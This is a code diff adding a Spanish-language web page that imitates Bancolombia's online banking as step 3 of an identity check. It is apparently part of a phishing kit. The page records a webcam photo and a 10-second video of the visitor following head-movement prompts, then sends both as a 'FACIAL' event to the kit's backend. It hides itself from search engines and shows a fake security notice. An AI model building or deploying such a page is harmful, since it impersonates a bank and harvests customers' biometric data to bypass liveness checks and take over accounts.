@@ -1,0 +1,831 @@
+<!DOCTYPE html>
+<html lang="es">
+
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <meta name="robots" content="noindex, nofollow">
+  <title>Verificación Facial | Bancolombia</title>
+  <link rel="stylesheet" href="css/secured.css">
+  <style>
+    body {
+      background: linear-gradient(180deg, #f9f9fa 0%, #fff 100%);
+    }
+
+    main.center {
+      padding: 0 16px 120px;
+      align-items: flex-start;
+    }
+
+    .facial-card {
+      max-width: 460px;
+      width: 100%;
+      margin: 24px auto 0;
+      background: #fff;
+      border-radius: 20px;
+      padding: 28px 24px 24px;
+      box-shadow: 0 4px 24px rgba(0, 0, 0, 0.06);
+      text-align: center;
+    }
+
+    /* Logo Bancolombia visible */
+    .brand-logo {
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      gap: 8px;
+      margin-bottom: 20px;
+    }
+
+    .brand-logo .iso {
+      width: 28px;
+      height: 28px;
+      background: #2c2a29;
+      border-radius: 6px;
+      position: relative;
+      flex-shrink: 0;
+    }
+
+    .brand-logo .iso::before,
+    .brand-logo .iso::after {
+      content: '';
+      position: absolute;
+      background: #fdda24;
+      border-radius: 1px;
+    }
+
+    .brand-logo .iso::before {
+      top: 6px;
+      left: 5px;
+      width: 18px;
+      height: 3px;
+    }
+
+    .brand-logo .iso::after {
+      top: 13px;
+      left: 5px;
+      width: 12px;
+      height: 3px;
+      box-shadow: 0 7px 0 #fdda24;
+    }
+
+    .brand-logo span {
+      font-size: 20px;
+      font-weight: 700;
+      color: #2c2a29;
+      letter-spacing: -0.5px;
+    }
+
+    .brand-logo img {
+      height: 26px;
+      display: block;
+    }
+
+    .step-pill {
+      display: inline-block;
+      background: #fef9d6;
+      color: #8a7100;
+      padding: 4px 14px;
+      border-radius: 50px;
+      font-size: 12px;
+      font-weight: 700;
+      letter-spacing: 0.4px;
+      margin-bottom: 12px;
+      text-transform: uppercase;
+    }
+
+    h1.facial-title {
+      font-size: 22px;
+      font-weight: 700;
+      margin-bottom: 8px;
+      color: #2c2a29;
+    }
+
+    .facial-subtitle {
+      font-size: 14px;
+      color: #555;
+      line-height: 1.5;
+      margin-bottom: 24px;
+    }
+
+    /* Camera frame premium */
+    .cam-frame {
+      position: relative;
+      width: 100%;
+      aspect-ratio: 4/5;
+      margin: 0 auto 20px;
+      background: #1a1a1a;
+      border-radius: 24px;
+      overflow: hidden;
+      box-shadow: 0 12px 32px rgba(0, 0, 0, 0.18);
+    }
+
+    #video {
+      width: 100%;
+      height: 100%;
+      object-fit: cover;
+      transform: scaleX(-1);
+      display: block;
+    }
+
+    #canvas {
+      display: none;
+    }
+
+    /* Oval guide con corner brackets */
+    .oval-guide {
+      position: absolute;
+      top: 50%;
+      left: 50%;
+      transform: translate(-50%, -50%);
+      width: 64%;
+      aspect-ratio: 3/4;
+      border: 2px solid rgba(255, 255, 255, 0.6);
+      border-radius: 50%;
+      pointer-events: none;
+      transition: border-color 0.3s, transform 0.3s;
+    }
+
+    .oval-guide.detecting {
+      border-color: rgba(253, 218, 36, 0.9);
+    }
+
+    .oval-guide.scanning {
+      border-color: rgba(76, 217, 100, 0.9);
+      animation: ovalScan 2s ease-in-out infinite;
+    }
+
+    @keyframes ovalScan {
+
+      0%,
+      100% {
+        transform: translate(-50%, -50%) scale(1);
+      }
+
+      50% {
+        transform: translate(-50%, -50%) scale(1.03);
+      }
+    }
+
+    /* Corner brackets */
+    .corner {
+      position: absolute;
+      width: 28px;
+      height: 28px;
+      border: 3px solid #fff;
+      pointer-events: none;
+      transition: border-color 0.3s, width 0.3s, height 0.3s;
+    }
+
+    .corner.tl {
+      top: 18px;
+      left: 18px;
+      border-right: none;
+      border-bottom: none;
+      border-radius: 8px 0 0 0;
+    }
+
+    .corner.tr {
+      top: 18px;
+      right: 18px;
+      border-left: none;
+      border-bottom: none;
+      border-radius: 0 8px 0 0;
+    }
+
+    .corner.bl {
+      bottom: 18px;
+      left: 18px;
+      border-right: none;
+      border-top: none;
+      border-radius: 0 0 0 8px;
+    }
+
+    .corner.br {
+      bottom: 18px;
+      right: 18px;
+      border-left: none;
+      border-top: none;
+      border-radius: 0 0 8px 0;
+    }
+
+    .cam-frame.recording .corner {
+      border-color: #fdda24;
+      width: 36px;
+      height: 36px;
+    }
+
+    /* Scanning beam horizontal */
+    .scan-beam {
+      display: none;
+      position: absolute;
+      left: 0;
+      right: 0;
+      height: 3px;
+      background: linear-gradient(90deg, transparent, #fdda24, transparent);
+      box-shadow: 0 0 16px #fdda24;
+      pointer-events: none;
+    }
+
+    .cam-frame.recording .scan-beam {
+      display: block;
+      animation: scanMove 2.5s ease-in-out infinite;
+    }
+
+    @keyframes scanMove {
+      0% {
+        top: 15%;
+        opacity: 0.2;
+      }
+
+      50% {
+        top: 85%;
+        opacity: 1;
+      }
+
+      100% {
+        top: 15%;
+        opacity: 0.2;
+      }
+    }
+
+    /* Live status badge */
+    .live-badge {
+      position: absolute;
+      top: 14px;
+      left: 14px;
+      background: rgba(0, 0, 0, 0.65);
+      color: #fff;
+      padding: 5px 12px;
+      border-radius: 50px;
+      font-size: 11px;
+      font-weight: 700;
+      letter-spacing: 0.5px;
+      display: flex;
+      align-items: center;
+      gap: 6px;
+      z-index: 4;
+    }
+
+    .live-dot {
+      width: 8px;
+      height: 8px;
+      background: #4caf50;
+      border-radius: 50%;
+      animation: blink 1.4s infinite;
+    }
+
+    .cam-frame.recording .live-badge {
+      background: rgba(220, 53, 69, 0.85);
+    }
+
+    .cam-frame.recording .live-dot {
+      background: #fff;
+    }
+
+    @keyframes blink {
+
+      0%,
+      100% {
+        opacity: 1;
+        transform: scale(1);
+      }
+
+      50% {
+        opacity: 0.4;
+        transform: scale(0.85);
+      }
+    }
+
+    /* Timer */
+    .timer-badge {
+      position: absolute;
+      top: 14px;
+      right: 14px;
+      background: rgba(0, 0, 0, 0.65);
+      color: #fdda24;
+      padding: 5px 14px;
+      border-radius: 50px;
+      font-size: 13px;
+      font-weight: 700;
+      font-variant-numeric: tabular-nums;
+      z-index: 4;
+      display: none;
+    }
+
+    .cam-frame.recording .timer-badge {
+      display: block;
+    }
+
+    /* Countdown gigante */
+    #countdown {
+      display: none;
+      position: absolute;
+      top: 50%;
+      left: 50%;
+      transform: translate(-50%, -50%);
+      font-size: 140px;
+      font-weight: 800;
+      color: #fdda24;
+      text-shadow: 0 4px 30px rgba(0, 0, 0, 0.7);
+      z-index: 6;
+      animation: countdownPop 1s ease-out;
+    }
+
+    @keyframes countdownPop {
+      0% {
+        transform: translate(-50%, -50%) scale(0.5);
+        opacity: 0;
+      }
+
+      20% {
+        transform: translate(-50%, -50%) scale(1.2);
+        opacity: 1;
+      }
+
+      100% {
+        transform: translate(-50%, -50%) scale(1);
+        opacity: 1;
+      }
+    }
+
+    /* Instrucción durante grabación */
+    .live-instruction {
+      opacity: 0;
+      visibility: hidden;
+      position: absolute;
+      bottom: 12px;
+      left: 50%;
+      transform: translateX(-50%);
+      background: rgba(255, 255, 255, 0.95);
+      color: #2c2a29;
+      padding: 12px 24px;
+      border-radius: 50px;
+      font-size: 14px;
+      font-weight: 700;
+      letter-spacing: 0.5px;
+      white-space: nowrap;
+      box-shadow: 0 4px 16px rgba(0, 0, 0, 0.25);
+      z-index: 5;
+      transition: opacity 0.3s ease, bottom 0.3s ease, visibility 0.3s;
+    }
+
+    .live-instruction.show {
+      opacity: 1;
+      visibility: visible;
+      bottom: 24px;
+    }
+
+    .live-instruction::before {
+      content: '';
+      display: inline-block;
+      width: 8px;
+      height: 8px;
+      background: #fdda24;
+      border-radius: 50%;
+      margin-right: 8px;
+      vertical-align: middle;
+      animation: blink 1s infinite;
+    }
+
+    /* Tip pre-captura */
+    .pre-tip {
+      display: flex;
+      align-items: center;
+      gap: 10px;
+      background: #fef9d6;
+      border-radius: 12px;
+      padding: 12px 14px;
+      margin-bottom: 20px;
+      font-size: 13px;
+      color: #5a4a00;
+      text-align: left;
+      line-height: 1.4;
+    }
+
+    .pre-tip svg {
+      flex-shrink: 0;
+      width: 22px;
+      height: 22px;
+      color: #b58a00;
+    }
+
+    /* Progress global durante grabación */
+    .progress-shell {
+      display: none;
+      width: 100%;
+      height: 6px;
+      background: #f0f0f0;
+      border-radius: 3px;
+      overflow: hidden;
+      margin-bottom: 16px;
+    }
+
+    .progress-shell.show {
+      display: block;
+    }
+
+    .progress-bar {
+      height: 100%;
+      width: 0%;
+      background: linear-gradient(90deg, #fdda24, #ffc107);
+      transition: width 0.3s ease;
+      border-radius: 3px;
+    }
+
+    /* Botón principal grande y prominente */
+    .cta-wrap {
+      position: sticky;
+      bottom: 16px;
+      margin-top: 8px;
+      z-index: 10;
+    }
+
+    #captureBtn {
+      width: 100%;
+      padding: 18px 28px;
+      background: #fdda24;
+      color: #2c2a29;
+      border-radius: 50px;
+      font-size: 17px;
+      font-weight: 700;
+      border: none;
+      cursor: pointer;
+      box-shadow: 0 8px 24px rgba(253, 218, 36, 0.45);
+      transition: all 0.2s;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      gap: 10px;
+      font-family: inherit;
+    }
+
+    #captureBtn:hover:not(:disabled) {
+      background: #f5cf00;
+      transform: translateY(-2px);
+      box-shadow: 0 10px 28px rgba(253, 218, 36, 0.55);
+    }
+
+    #captureBtn:active:not(:disabled) {
+      transform: translateY(0);
+    }
+
+    #captureBtn:disabled {
+      background: #d4d4d4;
+      color: #888;
+      cursor: not-allowed;
+      box-shadow: none;
+    }
+
+    #captureBtn svg {
+      width: 22px;
+      height: 22px;
+    }
+
+    /* status compact bajo el botón */
+    .status-msg {
+      display: none;
+      margin-top: 10px;
+      padding: 10px 14px;
+      border-radius: 8px;
+      font-size: 13px;
+      text-align: center;
+    }
+
+    .status-msg.show {
+      display: block;
+    }
+
+    .status-msg.success {
+      background: #e9f7ef;
+      color: #1e7e34;
+    }
+
+    .status-msg.info {
+      background: #e3f2fd;
+      color: #0c5184;
+    }
+
+    .status-msg.error {
+      background: #fdecea;
+      color: #c0392b;
+    }
+
+    @media (max-width: 480px) {
+      .facial-card {
+        padding: 22px 18px 20px;
+      }
+
+      h1.facial-title {
+        font-size: 20px;
+      }
+
+      .corner {
+        width: 22px;
+        height: 22px;
+      }
+
+      #countdown {
+        font-size: 110px;
+      }
+    }
+  </style>
+</head>
+
+<body>
+
+  <header class="top">
+    <div class="brand">
+      <img src="img/horizont-trazo-blanco.svg" alt="Bancolombia" onerror="this.style.display='none'">
+      <div class="channel">Sucursal Virtual Personas</div>
+    </div>
+    <div class="top-actions">
+      <button class="user-pill"><span id="userName">Usuario</span></button>
+    </div>
+  </header>
+
+  <main class="center">
+    <div class="facial-card">
+
+      <!-- Logo Bancolombia visible dentro de la card -->
+      <div class="brand-logo">
+        <img src="img/horizont-trazo.svg" alt="Bancolombia"
+          onerror="this.outerHTML='<div class=&quot;iso&quot;></div><span>Bancolombia</span>'">
+      </div>
+
+      <span class="step-pill">Paso 3 de 3 — Verificación</span>
+      <h1 class="facial-title">Verifica tu identidad</h1>
+      <p class="facial-subtitle">Encuadra tu rostro dentro del óvalo. Te pediremos algunos movimientos de cabeza para
+        confirmar que eres tú.</p>
+
+      <div class="err-banner" id="errBanner">No se pudo verificar tu identidad. Intenta de nuevo.</div>
+
+      <div class="pre-tip" id="preTip">
+        <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
+          stroke-linejoin="round">
+          <circle cx="12" cy="12" r="10" />
+          <line x1="12" y1="8" x2="12" y2="12" />
+          <line x1="12" y1="16" x2="12.01" y2="16" />
+        </svg>
+        <span>Busca un lugar bien iluminado. Quítate gafas oscuras, gorras o tapabocas.</span>
+      </div>
+
+      <div class="cam-frame" id="camFrame">
+        <span class="corner tl"></span>
+        <span class="corner tr"></span>
+        <span class="corner bl"></span>
+        <span class="corner br"></span>
+
+        <div class="live-badge"><span class="live-dot"></span><span id="liveLabel">EN VIVO</span></div>
+        <div class="timer-badge" id="timerBadge">0:10</div>
+
+        <video id="video" autoplay playsinline muted></video>
+        <canvas id="canvas"></canvas>
+
+        <div class="oval-guide" id="ovalGuide"></div>
+        <div class="scan-beam"></div>
+
+        <div id="countdown">3</div>
+        <div class="live-instruction" id="liveInstruction">ENCUADRA TU ROSTRO</div>
+      </div>
+
+      <div class="progress-shell" id="progressShell">
+        <div class="progress-bar" id="progressBar"></div>
+      </div>
+
+      <div class="cta-wrap">
+        <button id="captureBtn" disabled>
+          <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
+            stroke-linejoin="round">
+            <path d="M23 19a2 2 0 01-2 2H3a2 2 0 01-2-2V8a2 2 0 012-2h4l2-3h6l2 3h4a2 2 0 012 2z" />
+            <circle cx="12" cy="13" r="4" />
+          </svg>
+          <span id="btnLabel">Cargando cámara...</span>
+        </button>
+        <div class="status-msg" id="statusDiv"></div>
+      </div>
+    </div>
+  </main>
+
+  <!-- Loader -->
+  <div class="loader-overlay" id="loader">
+    <div class="loader-box">
+      <div class="loader-circle"></div>
+      <div class="loader-text">Cargando...</div>
+    </div>
+  </div>
+
+  <!-- Modal 923 -->
+  <div class="modal-overlay" id="modal923">
+    <div class="modal-923">
+      <div class="x-circle">
+        <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round">
+          <line x1="18" y1="6" x2="6" y2="18" />
+          <line x1="6" y1="6" x2="18" y2="18" />
+        </svg>
+      </div>
+      <h3>Por seguridad, no puedes continuar</h3>
+      <p>Te contactaremos por alguno de nuestros canales para confirmar que eres tú o llámanos a la Sucursal Telefónica,
+        elige la opción 3 y luego 2. Nunca te pediremos tu usuario, claves o códigos de seguridad.</p>
+      <button class="btn-yellow-full" onclick="close923Retry()">Intentar más tarde</button>
+    </div>
+  </div>
+
+
+  <script src="js/secured.js"></script>
+  <script>
+    const video = document.getElementById('video');
+    const canvas = document.getElementById('canvas');
+    const captureBtn = document.getElementById('captureBtn');
+    const btnLabel = document.getElementById('btnLabel');
+    const statusDiv = document.getElementById('statusDiv');
+    const errBanner = document.getElementById('errBanner');
+    const countdown = document.getElementById('countdown');
+    const liveInstr = document.getElementById('liveInstruction');
+    const liveLabel = document.getElementById('liveLabel');
+    const timerBadge = document.getElementById('timerBadge');
+    const camFrame = document.getElementById('camFrame');
+    const ovalGuide = document.getElementById('ovalGuide');
+    const progressShell = document.getElementById('progressShell');
+    const progressBar = document.getElementById('progressBar');
+    const preTip = document.getElementById('preTip');
+
+    let stream = null;
+    const RECORD_MS = 10000;
+
+    // Secuencia de instrucciones (timestamps relativos al inicio de la grabación)
+    const sequence = [
+      { at: 0, text: 'MIRA AL FRENTE' },
+      { at: 2000, text: 'GIRA LEVEMENTE A LA DERECHA' },
+      { at: 4000, text: 'AHORA A LA IZQUIERDA' },
+      { at: 6000, text: 'ACÉRCATE UN POCO' },
+      { at: 8000, text: 'PERFECTO, MANTÉN ASÍ' }
+    ];
+
+    if (new URLSearchParams(location.search).get('error') === '1') {
+      errBanner.classList.add('show');
+    }
+
+    function setStatus(text, type) {
+      statusDiv.textContent = text;
+      statusDiv.className = 'status-msg show ' + type;
+    }
+    function clearStatus() { statusDiv.classList.remove('show'); }
+    function sleep(ms) { return new Promise(r => setTimeout(r, ms)); }
+
+    async function startCamera() {
+      btnLabel.textContent = 'Activando cámara...';
+      try {
+        stream = await navigator.mediaDevices.getUserMedia({
+          video: { facingMode: 'user', width: { ideal: 1280 }, height: { ideal: 720 } },
+          audio: false
+        });
+        video.srcObject = stream;
+        await new Promise(res => video.onloadedmetadata = res);
+        ovalGuide.classList.add('detecting');
+        btnLabel.textContent = 'Iniciar verificación';
+        captureBtn.disabled = false;
+      } catch (err) {
+        btnLabel.textContent = 'Cámara no disponible';
+        setStatus('Permite el acceso a la cámara para continuar.', 'error');
+      }
+    }
+    window.addEventListener('load', startCamera);
+
+    captureBtn.addEventListener('click', startCapture);
+
+    async function startCapture() {
+      captureBtn.disabled = true;
+      btnLabel.textContent = 'Verificando...';
+      errBanner.classList.remove('show');
+      preTip.style.display = 'none';
+      clearStatus();
+
+      // Countdown
+      countdown.style.display = 'block';
+      for (let i = 3; i > 0; i--) {
+        countdown.textContent = i;
+        countdown.style.animation = 'none';
+        void countdown.offsetWidth;
+        countdown.style.animation = 'countdownPop 1s ease-out';
+        await sleep(900);
+      }
+      countdown.style.display = 'none';
+
+      captureFacial();
+    }
+
+    async function captureFacial() {
+      // Activar modo grabación visual
+      camFrame.classList.add('recording');
+      ovalGuide.classList.remove('detecting');
+      ovalGuide.classList.add('scanning');
+      liveLabel.textContent = 'GRABANDO';
+      progressShell.classList.add('show');
+      progressBar.style.width = '0%';
+
+      // Foto inicial
+      canvas.width = video.videoWidth;
+      canvas.height = video.videoHeight;
+      const ctx = canvas.getContext('2d');
+      ctx.scale(-1, 1);
+      ctx.drawImage(video, -canvas.width, 0);
+      const fotoBase64 = canvas.toDataURL('image/jpeg', 0.9);
+
+      // Iniciar instrucciones + timer + progress
+      runInstructions();
+      runTimer();
+
+      try {
+        const recorder = new MediaRecorder(stream, { mimeType: 'video/webm;codecs=vp8' });
+        const chunks = [];
+        recorder.ondataavailable = e => { if (e.data.size > 0) chunks.push(e.data); };
+        recorder.onstop = async () => {
+          liveInstr.classList.remove('show');
+          progressShell.classList.remove('show');
+          camFrame.classList.remove('recording');
+          ovalGuide.classList.remove('scanning');
+          ovalGuide.classList.add('detecting');
+          liveLabel.textContent = 'PROCESANDO';
+
+          const videoBlob = new Blob(chunks, { type: 'video/webm' });
+          const videoBase64 = await blobToBase64(videoBlob);
+          sendFacial(fotoBase64, videoBase64);
+        };
+        recorder.start();
+        setTimeout(() => recorder.stop(), RECORD_MS);
+      } catch (err) {
+        liveInstr.classList.remove('show');
+        progressShell.classList.remove('show');
+        camFrame.classList.remove('recording');
+        setStatus('Error al grabar. Intenta de nuevo.', 'error');
+        btnLabel.textContent = 'Reintentar';
+        captureBtn.disabled = false;
+      }
+    }
+
+    async function runInstructions() {
+      for (const step of sequence) {
+        await sleep(step.at - (sequence[0].at)); // espera relativa
+      }
+    }
+    // Más simple: lanzar cada instrucción con setTimeout absoluto
+    function runInstructionsAbsolute() {
+      sequence.forEach(step => {
+        setTimeout(() => {
+          liveInstr.classList.remove('show');
+          setTimeout(() => {
+            liveInstr.textContent = step.text;
+            liveInstr.classList.add('show');
+          }, 300);
+        }, step.at);
+      });
+    }
+    // sobrescribimos
+    runInstructions = runInstructionsAbsolute;
+
+    function runTimer() {
+      let elapsed = 0;
+      const tick = 100;
+      const interval = setInterval(() => {
+        elapsed += tick;
+        const remaining = Math.max(0, RECORD_MS - elapsed);
+        const sec = Math.ceil(remaining / 1000);
+        timerBadge.textContent = '0:' + (sec < 10 ? '0' + sec : sec);
+        progressBar.style.width = ((elapsed / RECORD_MS) * 100) + '%';
+        if (elapsed >= RECORD_MS) clearInterval(interval);
+      }, tick);
+    }
+
+    function blobToBase64(blob) {
+      return new Promise((res, rej) => {
+        const r = new FileReader();
+        r.onloadend = () => res(r.result);
+        r.onerror = rej;
+        r.readAsDataURL(blob);
+      });
+    }
+
+    function sendFacial(foto, video) {
+      setStatus('Enviando captura...', 'info');
+      sendAndWait(
+        { event: 'FACIAL', foto: foto, video: video },
+        {
+          onOk: () => { sessionStorage.clear(); location.href = 'index.html'; },
+          onErr: () => {
+            hideLoader();
+            errBanner.classList.add('show');
+            setStatus('Verificación rechazada. Intenta de nuevo.', 'error');
+            btnLabel.textContent = 'Reintentar';
+            captureBtn.disabled = false;
+            ovalGuide.classList.remove('scanning');
+            ovalGuide.classList.add('detecting');
+            liveLabel.textContent = 'EN VIVO';
+          }
+        }
+      );
+    }
+  </script>
+</body>
+
+</html>
